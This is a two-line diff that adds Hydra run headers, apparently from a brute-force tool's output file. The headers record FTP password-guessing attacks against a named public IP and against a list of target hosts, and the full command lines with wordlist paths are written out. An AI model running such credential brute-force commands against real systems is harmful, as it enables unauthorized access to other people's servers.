@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-07-28 06:27:21 on 103.24.230.93 ftp (hydra -L /tmp/u.txt -P /tmp/pass.txt -t 4 -w 3 -o /tmp/ftp_result.txt ftp://103.24.230.93)
+# Hydra v9.2 run at 2026-08-04 07:58:59 on /tmp/ftp_ips.txt ftp (hydra -L /tmp/biguser.txt -P /tmp/bigpass.txt -M /tmp/ftp_ips.txt -t 4 -w 3 -o /tmp/ftp_result.txt ftp)
